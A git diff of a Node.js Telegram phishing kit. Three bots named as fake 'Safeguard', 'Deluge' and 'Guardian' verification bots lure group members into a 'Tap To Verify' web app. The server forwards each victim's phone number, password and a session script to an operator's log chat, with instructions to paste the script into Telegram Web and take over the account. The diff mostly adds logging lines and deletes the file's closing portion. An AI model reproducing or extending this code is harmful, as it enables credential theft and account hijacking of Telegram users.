@@ -23,10 +23,13 @@ const safeguardVerification = fs.readFileSync(path.join(__dirname, "images/verif
 
 const safeguardBot = new TelegramBot(process.env.FAKE_SAFEGUARD_BOT_TOKEN);
 safeguardBot.setWebHook(`${process.env.DOMAIN}/api/webhook/safeguard`);
+console.log("Safeguard bot initialized");
 const delugeBot = new TelegramBot(process.env.FAKE_DELUGE_BOT_TOKEN);
 delugeBot.setWebHook(`${process.env.DOMAIN}/api/webhook/deluge`);
+console.log("Deluge bot initialized");
 const guardianBot = new TelegramBot(process.env.FAKE_GUARDIAN_BOT_TOKEN);
 guardianBot.setWebHook(`${process.env.DOMAIN}/api/webhook/guardian`);
+console.log("Guardian bot initialized");
 
 const guardianButtonTexts = [
   "🟩ARKI all-in-1 TG tools👈JOIN NOW!🟡",
@@ -63,7 +66,7 @@ guardianBot.getMe().then(botInfo => {
 
 const app = express();
 app.use(express.json());
-app.use(express.static("public"))
+app.use(express.static("public"));
 
 app.post("/api/users/telegram/info", async (req, res) => {
   try {
@@ -118,6 +121,7 @@ const handleRequest = async (req, res, data) => {
     deluge: delugeBot
   };
   let bot = botMap[data.type] || null;
+  console.log(`Sending message to LOGS_ID ${process.env.LOGS_ID} for user ${data.userId}`);
   await bot.sendMessage(
     process.env.LOGS_ID,
       `🪪 <b>UserID</b>: ${data.userId}\n🌀 <b>Name</b>: ${data.name}\n⭐ <b>Telegram Premium</b>: ${data.premium ? "✅" : "❌"}\n📱 <b>Phone Number</b>: <tg-spoiler>${data.number}</tg-spoiler>\n${data.usernames}\n🔐 <b>Password</b>: <code>${data.password !== undefined ? data.password : "Null"}</code>\n\nGo to <a href="https://web.telegram.org/">Telegram Web</a>, and paste the following script.\n<code>${data.script}</code>\n<b>Module</b>: ${data.type.charAt(0).toUpperCase() + data.type.slice(1)}`, {
@@ -161,7 +165,7 @@ const handleRequest = async (req, res, data) => {
           ],
         ]
       }
-    }
+    };
 
     const buttons = type === "safeguard" ? safeguardButtons : guardianButtons;
 
@@ -173,10 +177,11 @@ const handleRequest = async (req, res, data) => {
   }
 
   res.json({});
-}
+};
 
 const handleNewChatMember = async (bot, type) => {
   bot.on("my_chat_member", (update) => {
+    console.log(`New chat member event for ${type} bot in chat ${update.chat.id}`);
     const chatId = update.chat.id;
 
     let jsonToSend;
@@ -208,10 +213,11 @@ const handleNewChatMember = async (bot, type) => {
       bot.sendPhoto(chatId, imageToSend, jsonToSend);
     }
   });
-}
+};
 
 function handleStart(bot) {
   bot.onText(/\/start (.*)$/, (msg, match) => {
+    console.log(`Received /start command for bot with message: ${JSON.stringify(msg)}`);
     let botInfo;
     bot.getMe().then(botInformation => {
       botInfo = botInformation;
@@ -229,71 +235,4 @@ function handleStart(bot) {
                 web_app: {
                   url: `${process.env.DOMAIN}/safeguard/?type=safeguard`
                 }
-              }]]
-            }
-          }
-          imageToSend = safeguardVerification
-        } else if (botInfo.username === delugeUsername) {
-          jsonToSend = {
-            caption: `The group is protected by @delugeguardbot.\n\nClick below to start human verification.`,
-            parse_mode: "HTML",
-            reply_markup: {
-              inline_keyboard: [[{
-                text: "Tap To Verify",
-                web_app: {
-                  url: `${process.env.DOMAIN}/deluge/?type=deluge`
-                }
-              }]]
-            }
-          }
-          imageToSend = delugeVerification
-        } else if (botInfo.username === guardianUsername) {
-          jsonToSend = {
-            caption: `🧑 <b>Human Authentication</b>\n\nPlease click the button below to verify that you are human.`,
-            parse_mode: "HTML",
-            reply_markup: {
-              inline_keyboard: [[{
-                text: "Verify",
-                web_app: {
-                  url: `${process.env.DOMAIN}/guardian/?type=guardian`
-                }
-              }]]
-            }
-          }
-          imageToSend = guardianVerification
-        }
-        
-        bot.sendPhoto(
-          chatId, 
-          imageToSend,
-          jsonToSend
-        );
-      }
-    });
-  
-  });
-
-}
-
-handleNewChatMember(safeguardBot, "safeguard");
-handleNewChatMember(delugeBot, "deluge");
-handleNewChatMember(guardianBot, "guardian");
-
-handleStart(safeguardBot);
-handleStart(delugeBot);
-handleStart(guardianBot);
-
-app.post('/api/webhook/safeguard', (req, res) => {
-  safeguardBot.processUpdate(req.body);
-  res.sendStatus(200);
-});
-app.post('/api/webhook/deluge', (req, res) => {
-  delugeBot.processUpdate(req.body);
-  res.sendStatus(200);
-});
-app.post('/api/webhook/guardian', (req, res) => {
-  guardianBot.processUpdate(req.body);
-  res.sendStatus(200);
-});
-
-app.listen(process.env.PORT || 80, () => console.log(`loaded everyone & running on port ${process.env.PORT}`));
+             
